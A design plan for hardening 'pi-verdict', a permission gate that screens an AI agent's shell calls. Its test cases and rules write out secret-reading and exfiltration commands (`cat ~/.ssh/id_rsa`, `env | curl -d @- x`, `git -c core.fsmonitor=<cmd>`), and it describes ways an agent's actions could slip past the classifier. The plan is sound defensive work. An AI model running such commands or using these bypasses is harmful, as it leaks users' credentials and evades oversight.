# Allow-rule operand grading, built-in fast path and floor gaps — plan

**Status: approved by the user on 2026-10-05, not yet executed.** It is independent of
`docs/plans/tool-access-hardening.md` and can land before or after it; see "Interaction with the tool-access plan".

Written 2026-10-05 against HEAD `c7f9d2e` (`v0.17.0`). The source is the evaluation of odin-rnd EXP 007
(`research/odin-blueprint-floor-evaluation.md`). Every gap below was reproduced at HEAD, with `adjudicate` or with the
exported `allowAdmits` and `bashPathTokens`. The git behaviour was checked with git 2.43.0. Line references are to
`extensions/pi-verdict.ts` at that commit.

## Context

ADR-0008 lets a user `allow` regex admit only one simple command (`allowAdmits`, `:462`), but that check reads the
command's *shape*, not its *operands*. Two consequences follow. A file the floor would deny to a file tool is allowed
by rule when bash reads it. A git subcommand that reads or runs things outside the repository is also allowed by rule.
The documented example policy is affected: `docs/configuration.md:9`, `README.md:96` and the config template comment
at `:685` all ship `allow: ["^git (status|log|diff)\\b"]`.

The path tiers (S0/S1, `classifyPath`) run only for file tools. For bash they never see an operand, so a secret read
through bash is a classifier call at best, and under an allow rule it is a silent rule allow. The handover's first
layering consequence describes this gap; this plan closes it for the allow path.

Measured at HEAD. The config was `allow: ["^git (status|log|diff)\\b", "^cat\\b"]`, the run was headless, and there
was no model:

| Command | Verdict | Why |
| --- | --- | --- |
| `git diff --no-index /dev/null ~/.ssh/id_rsa` | `allow/rule` | the operand is never graded; prints the key |
| `git diff /dev/null ~/.ssh/id_rsa` (no `--no-index`) | `allowAdmits` true | git implies `--no-index` when a path is outside the work tree (verified: `git diff /dev/null /etc/hostname` in a fresh repo prints the file) |
| `cat ~/.ssh/id_rsa` | `allow/rule` | the same gap under a broader allow |
| `git grep --no-index -e . ~/.ssh/id_rsa` | `allowAdmits` true | `grep --no-index` reads arbitrary files |
| `cat .env` | `allowAdmits` true; `bashPathTokens` returns `[]` | a bare filename with no slash is not a path token, so token-based grading would miss it |
| `git -c core.fsmonitor=<cmd> status` | `allowAdmits` true | `-c core.fsmonitor` runs `<cmd>` on `status` (verified: a `touch` ran in a fresh repo); an allow such as `^git\b` admits it |

Three smaller floor gaps, from the same evaluation:

- `read ~/.config/gcloud/access_tokens.db` is `allow/rule`. Only the `credentials*` names are S0.
- `dd … of=/dev/disk2` and `of=/dev/rdisk2` (macOS device names) miss `raw-device` (`:117-118`).
- `git stash clear` reaches only the classifier.

## Items

### 1. `allowAdmits` grades every operand (size S; BREAKING)

**Change.** `allowAdmits(command)` becomes `allowAdmits(command, cwd)`. After the existing shape checks, it grades
every operand word of the simple command through `classifyPath(word, cwd, /* isWrite */ false, /* floorOn */ true)`.
The admission is refused when any operand grades other than `allow`, which means S0 (deny) or S1 read (gray).

- **Operands** are every word after the command word, from the `shellWords` view `allowAdmits` already computes:
  - each word that does not start with `-`;
  - the value part of an attached option (`--file=<v>`, `-f<v>` is not split; only `=`-attached values).

  Do **not** use `bashPathTokens`: it drops a bare filename with no slash (`cat .env` → `[]`). Grading every word
  over-extracts (`main` resolves to `<cwd>/main`, which grades `allow`), which is the safe direction.
- **`floorOn` is always `true` here.** The guard never denies; a refused admission only sends the call to the
  classifier. `builtinDenyFloor: false` therefore must not weaken it. Record that in the code comment.
- **Cost.** One `classifyPath` per operand, including its realpath and kernel walk. Cap the graded operands at a fixed
  number (for example 64). Past the cap, refuse the admission, which keeps the fail direction safe.
- **Caller.** The user allow loop in `classifyByRules` passes `cwd`. `allowAdmits` is exported, so the probe and the
  tests that call it directly need the new argument.

**Why not a floor deny.** The S0 regexes as a bash deny would false-positive on `ssh -i ~/.ssh/id_x host` and on
`ssh-keygen -f`. The evaluation rejects that, and this item does not do it. A refused allow only reaches the
classifier, so the change can never turn an allow into a deny on its own.

**Tests (failing before, passing after).** Use a `describe("allow operand grading (ADR-0008 amendment)")` block, with
literals built by concatenation:

- Under `allow: ["^git (status|log|diff)\\b"]`, `git diff --no-index /dev/null ~/.ssh/id_rsa` and
  `git diff /dev/null ~/.ssh/id_rsa` both reach the classifier (`h.calls` length 1).
- Under `allow: ["^cat\\b"]`, these reach the classifier: `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, `cat .env`
  (in a cwd containing `.env`) and `cat /etc/shadow` (S1 read).
- Controls that stay `allow/rule` with zero calls: `cat README.md`, `git status`, `git log --oneline`, `ls -la`.
- `allowAdmits` unit pins for an attached value (`--file=~/.ssh/id_rsa`) and for the operand cap.
- Under `builtinDenyFloor: false`, `cat ~/.ssh/id_rsa` still does not rule-allow.

**Probe.** Add cases to the `user-allow` family with `config.allow` set to the documented example, expecting
`classifier`, for the two `git diff` spellings, `cat .env` and `cat ~/.ssh/id_rsa`. Add the controls as `allow`. Each
new case enters as `known: "open"` and loses its marker in this item's commit.

**Docs.** Add an ADR-0008 amendment listing the new guard (f), operand grading, and why it is not a floor deny. Add a
CHANGELOG `### Changed` entry marked **BREAKING**: allow rules no longer admit commands whose operands are secrets or
system configuration. Add a `docs/configuration.md` note next to the `allow` key.

### 2. Git subcommands that reach outside the repository (size S; BREAKING)

Item 1 grades secrets, but git can also read files outside the repository that are not S0, such as
`~/.bash_history` (S0 already) or `/proc/self/environ`. It can also run commands through configuration. Add to
`allowAdmits`, beside the existing `GIT_WRITE_FLAGS` check (`:447`, `:484-489`):

- **(g) reads outside the work tree.** For a `git` invocation whose subcommand is `diff` or `grep`, refuse admission
  when `--no-index` is present. Also refuse it when any operand that is not an option resolves outside `cwd` (lexical
  or real form, via `baseForms`). git applies `--no-index` implicitly in that case, so the flag alone is not enough.
  Over-refusal, such as a `git diff` of two in-repo revisions named like paths, only costs a classifier call.
- **(h) configuration injection.** Refuse admission when any word before the subcommand is `-c`, starts with `-c` and
  is longer than 2 characters, or is `--config-env` / `--config-env=…`. `-c` can set `core.fsmonitor`,
  `core.pager`, `diff.external`, `core.sshCommand` or a `!` alias, and each of those runs a program. The documented
  `^git (status|log|diff)` regex does not match `git -c … status`, so this matters for broader user allows such as
  `^git\b`. Also refuse `-C <dir>` when `<dir>` resolves outside `cwd`, so the existing outside-cwd reasoning cannot
  be dodged by retargeting.

**Tests.** Under `allow: ["^git\\b"]`, each of these reaches the classifier:

- `git diff /dev/null /etc/hostname`;
- `git diff --no-index a b`;
- `git grep --no-index -e x /etc`;
- `git -c core.fsmonitor=x status`;
- `git -C / status`.

Controls that stay `allow/rule`: `git status`, `git diff HEAD~1`, `git diff -- src/x.ts` (an in-cwd file) and
`git -C . status`.

**Probe.** Add `user-allow` cases for the `-c core.fsmonitor` and implicit-`--no-index` spellings, expecting
`classifier`. Enter them as open cases.

**Docs.** Fold this into the same ADR-0008 amendment and CHANGELOG entry as item 1. Update the `GIT_WRITE_FLAGS`
comment, which then covers reads and execution as well as writes.

### 3. gcloud joins the home-anchored S0 set (size XS)

Add `gcloud` to the home branch of the first `buildAnchoredS0` regex (`:1427`), next to `gnupg|age|sops`, and to its
XDG branch. gcloud keeps OAuth tokens and service-account keys under `~/.config/gcloud/` (`access_tokens.db`,
`credentials.db`, `legacy_credentials/`). Anchor it to the home or XDG root, not segment-anywhere, so a repository's
own `.config/gcloud/` reaches the classifier (the rationale at `:1414-1418`).

- **Tests and probe:**
  - `read ~/.config/gcloud/access_tokens.db` → `deny/rule` with reason `S0`;
  - the XDG spelling via `setXdgConfigRootsForTests`;
  - a control: `read <repo>/.config/gcloud/x` is not a rule deny.
- **Attribution:** the pattern comes from jev-engineering's `hard_deny` 09. Add a source comment
  (`eugeniughelbur/jev-engineering@82655a6d policy.json, MIT, Copyright (c) 2026 Eugeniu Ghelbur`). The
  evaluation's licensing section explains why.

### 4. `raw-device` covers macOS disk names (size XS)

Extend both device alternations in `raw-device` (`:118`) with `r?disk[0-9]`, so that
`>\s*\/dev\/(sd|hd|nvme|mmcblk|vd|xvd|r?disk[0-9])` and the matching `of=` form are covered. This pattern is derived
independently and needs no attribution. Do not adopt jev-engineering's broader `of=/dev/`, which would deny
`of=/dev/null`.

- **Probe:** `dd if=x of=/dev/disk2` and `of=/dev/rdisk2` → `deny/rule` with `ruleId: "raw-device"`.
- **Controls:** `dd if=x of=/dev/null` and `cat /dev/diskutil-notes` are not rule denies. Check the second spelling
  against the `[0-9]` requirement.

### 5. `git stash clear` danger rule (size XS)

Add `{ id: "git-stash-clear", pattern: /\bgit\s+stash\s+clear\b/i, reason: "git stash clear (drops all stashes)" }`
next to `git-reset-hard` (`:130`). This is a raw-text tripwire, so it follows the ADR-0007 monotone floor.

- **Probe:** `git stash clear` → `deny/rule` with `ruleId: "git-stash-clear"`.
- **Controls:** `git stash list`, `git stash pop` and `git stash drop` are not rule denies. Dropping a single stash
  stays with the classifier.
- **Attribution:** jev-engineering `hard_deny` 01. Use the same source comment as item 3.

### 6. Exfiltration tripwire and live-key literal (user decision; size XS each)

Both are optional. The value of each is defence against a classifier error only.

- **(a) Environment or history piped to the network:** a raw-text rule for
  `\b(env|printenv|history)\b[^;&]*\|\s*(curl|wget|nc|ncat)\b`. It is trivially evaded (`env > f; curl -T f …`), and
  ADR-0008 already refuses a user allow for any pipe. Controls: `env | grep PATH` and `history | tail`.
- **(b) A Stripe live key on the command line:** `\b(sk|rk)_live_[A-Za-z0-9]`. It matches data rather than an action
  shape, which departs from every current floor rule's convention.

**Recommendation, agreed with the user (2026-10-05): adopt (a) and skip (b).** (a) needs the jev-engineering
attribution (`hard_deny` 07/10). The rule gets the id `env-exfil` and sits beside `remote-exec`. Add these probe
cases:

- `env | curl -d @- x` and `history | nc host 1` → `deny/rule` with `ruleId: "env-exfil"`.
- The controls `env | grep PATH` and `history | tail` are not rule denies.

### 7. A built-in fast path for read-only inspection commands (size S-M; needs an ADR)

**The request.** jev-engineering ships a `fast_path`: eight first-word regexes that allow without a model call
(`eugeniughelbur/jev-engineering@82655a6d`, `policy.json:10-19`). Adopting one saves a classifier call (about 5-20 s)
on the commands an agent runs most. Their version cannot be adopted as is, for three reasons:

- It admits chains (`cd repo && cat x`) and runs before most of its own checks. ADR-0008 forbids both.
- It has no operand check, so `cat .env` and `cat ~/.npmrc` are fast-path allowed.
- Several entries run code that the agent controls, because the agent writes that code in-cwd without a check first.

Items 1-2 change that. With shape checking (ADR-0008) and operand grading in place, a fixed list of read-only commands
can be admitted soundly. So adopt a fast path **behind the same guard**, never beside it.

**Design.**

- **Mechanism.** Add a built-in list, `FAST_PATH_ALLOW`, of anchored regexes. It is evaluated exactly where user
  `allow` rules are evaluated: after the floor, user `deny`, the `.omp` gate and `denyPaths`, and only when
  `allowAdmits(command, cwd)` is true. It can therefore never override a deny or an ask, and it never sees a compound
  command or a secret operand.
- **Config.** A new key, `fastPath` (boolean). **It defaults to `true`; this is the recommendation, agreed with the
  user on 2026-10-05.** The list is read-only and sits behind the same guard as user allows, so it is sound for
  everyone, and the speed gain matters most to users who never write an allow rule. A user turns it off with
  `"fastPath": false`. A trusted project override may only set it to `false` (narrowing, in line with ADR-0006 and
  the tool-access plan's direction table). Add the key to `USER_CONFIG_TEMPLATE`, its `_hint` copy, `KNOWN_USER_KEYS`,
  `PROJECT_OVERRIDABLE_KEYS` with the narrowing direction, `docs/configuration.md` and the `/verdict` editor if it
  edits booleans. The CHANGELOG entry is not BREAKING, but it is a visible default change: commands on the list stop
  reaching the classifier. Say so in the entry.
- **Verdict.** `allow/rule` with the reason `built-in fast path`. Keep the rule id visible, so the probe and the
  audit can tell a fast-path allow from a user allow.

**What enters the list.** Each entry is checked against the semantics of what it runs, not against jev-engineering:

| Their entry | Decision | Reason |
| --- | --- | --- |
| `git (status\|diff\|log)` | adopt | read-only; item 2 covers `--no-index`, outside operands and `-c` |
| `git branch` | adopt **list forms only** | `-d`, `-D`, `-m`, `-M`, `-c`, `-C`, `-f`, `--delete`, `--move`, `--copy`, `--force`, `--set-upstream-to` and `-u` mutate refs; refuse when any is present |
| `git remote` | adopt **`-v`, bare, `show`, `get-url` only** | `add`, `remove`, `rename`, `set-url` and `prune` mutate |
| `git fetch` | **reject** | network access and ref writes; it can also run `core.sshCommand` from repo config |
| `ls`, `pwd`, `wc`, `tree`, `file`, `stat` | adopt | `ls -R` and `tree` list names, not content |
| `cat`, `head`, `tail` | adopt | operand grading (item 1) stops secrets; reject `tail -f`/`--follow`, which never returns (availability, not security) |
| `grep` | adopt, **non-recursive only, or recursive inside cwd** | `grep -r x ~` reads every secret under the home directory without naming one, so a whole-word operand grade cannot see it. Refuse `-r`, `-R`, `--recursive`, `-d recurse` and `--directories=recurse` when any operand, or the implicit cwd, resolves outside `cwd` |
| `echo` | adopt | `allowAdmits` already refuses redirection |
| `node`/`python3`/`npm`/`uv`/`cargo`/`go` `--version` | adopt, **exact form only** (`^\s*<tool>\s+--version\s*$`) | an extra argument after `--version` could change what runs |
| `npm`/`pnpm`/`yarn run test\|lint\|typecheck\|build` | **reject** | runs `package.json` scripts, which the agent can rewrite with an unreviewed in-cwd write; that is classifier-free code execution |
| `pytest`, `uv run pytest` | **reject** | runs test code the agent writes |
| `eslint`, `ruff`, `mypy`, `uv run ruff` | **reject** | eslint loads JavaScript configs and plugins, and mypy loads plugins from config; ruff is safe in principle, but one rule for the family is simpler |

The executable-code rejections are the important part. A fast path that admits `npm run test` turns "write
`package.json`, then run the tests" into an action no model ever sees. Users who accept that trade can still add the
regex to their own `allow` list, where ADR-0008's rule that the user endorses the claim applies.

**ADR.** This partly reverses the project's "no built-in allowlist" position (#12, `docs/layers.md:146-147`,
`research/rule-layer-security-audit.md` V3). Write a new ADR, taking the next free number at landing time, since the
tool-access plan reserves ADR-0009 and ADR-0010. It records three things:

- why V3's objection no longer holds: the guard is shape-checked and operand-graded, and the list is fixed and
  read-only;
- the list's admission criterion: read-only, no project-controlled code execution, bounded run time;
- the rejected entries, with their reasons.

Update `docs/layers.md`, the README pipeline diagram, `CONTEXT.md` (add the term "fast path") and
`docs/security-principles.md`, which states the no-built-in-allowlist principle.

**Tests and probe.** Add a `fast-path` probe family, with an empty user config:

- Each adopted form → `allow/rule`.
- Each rejected entry → `classifier`.
- Each refused variant → `classifier`: `git branch -D x`, `git remote add x y`, `grep -r x ~`, `tail -f log`,
  `node --version; id`.
- Each secret operand → `classifier`: `cat .env`, `head ~/.ssh/id_rsa`.
- `fastPath: false` → `classifier` for `ls`.
- A trusted project setting `fastPath: true` over a user `false` is ignored.

**Dependency.** Item 7 lands only after items 1-2, in its own commit; it is unsound without operand grading.

**Attribution.** The list is re-derived and narrowed. Still, cite jev-engineering `fast_path` as its origin in the
ADR and in a source comment, with the MIT notice from item 3.

### 8. Classifier wording: weakened transport security (size XS)

jev-axi's `SAFETY_QUESTIONS` names one family that `CLASSIFIER_SYSTEM` (`:2170-2179`) does not list explicitly:
disabling TLS verification or a firewall. Examples are `curl -k`, `git -c http.sslVerify=false`,
`NODE_TLS_REJECT_UNAUTHORIZED=0`, `ufw disable` and `iptables -F`. Add one sentence naming it to the classifier's
"weakens security" criterion. This is prompt text only; changes to the deterministic layers are out of scope.

- **Test:** pin the sentence's presence in `CLASSIFIER_SYSTEM`.
- **Attribution:** none needed, because the idea is restated, not copied.

### Nothing else to translate

The other six rule sets (hunch, abide, jev-pref, limpet, jev-belay, and the experiment's copy of upstream
pi-verdict) grade code diffs or session stop transcripts, not tool calls (`rules/SELECTION.md@292ccac:30-108,
160-172`). Their diff rules, such as forbidding `console.log` or `as` casts in added code, are code-review policy. A
permission gate does not inspect write content, so none of them maps onto this plugin.

## Interaction with the tool-access plan

`docs/plans/tool-access-hardening.md` Phase 2 reworks `userRuleTargets` and the user allow loop. Item 1 changes the
same loop's `allowAdmits` call. Whichever lands second rebases onto the other; there is no logical conflict, because
operand grading is orthogonal to the adapter's target extraction. Once the adapter exists, item 1 could read bash
operands from it instead. Record that as a follow-up, not a dependency. That plan reserves ADR-0009 and ADR-0010; this
plan creates no ADR and amends ADR-0008 only.

## Delivery

There are six commits. Each carries its failing-before tests, its probe cases with markers removed, its CHANGELOG
entry, docs sync and a regenerated `docs/coverage.md`:

1. `fix(rules): allow rules grade their operands and git's outside reach (items 1-2)`, with the ADR-0008 amendment
   and BREAKING notes.
2. `fix(floor): gcloud S0 home, macOS raw disks (items 3-4)`.
3. `fix(floor): git stash clear tripwire (item 5)`.
4. `fix(floor): environment and history exfiltration tripwire (item 6a)`.
5. `feat(rules): built-in fast path for read-only inspection commands (item 7)`, with its new ADR. It lands after
   commit 1.
6. `feat(classifier): name weakened transport security (item 8)`.

The shared verification set matches the tool-access plan's: `bun run typecheck`, `mise exec -- biome ci .`,
`bun test`, `bun run probe` (the existing cases never regress), and `bun run coverage && git diff --exit-code
docs/coverage.md`. Prove failing-before against a temp copy of `git show HEAD:extensions/pi-verdict.ts`, not by
stashing the shared worktree. Commits need the user's approval of this plan. There is no version bump, tag or push
unless the user asks.

## Decisions (all approved by the user on 2026-10-05)

1. Items 1-5 and item 8 as written. **Approved.**
2. Item 6: adopt (a), skip (b). **Agreed with the user on 2026-10-05.**
3. The operand cap in item 1: 64 operands; past that, refuse the admission. **Approved.**
4. Item 7's default: `fastPath` on by default. **Agreed with the user on 2026-10-05.**
5. Item 7's rejected entries: the package-script runners, the test runners and the linters. **Approved:** keep them
   out of the built-in list. A user who wants them can add them to their own `allow` list.
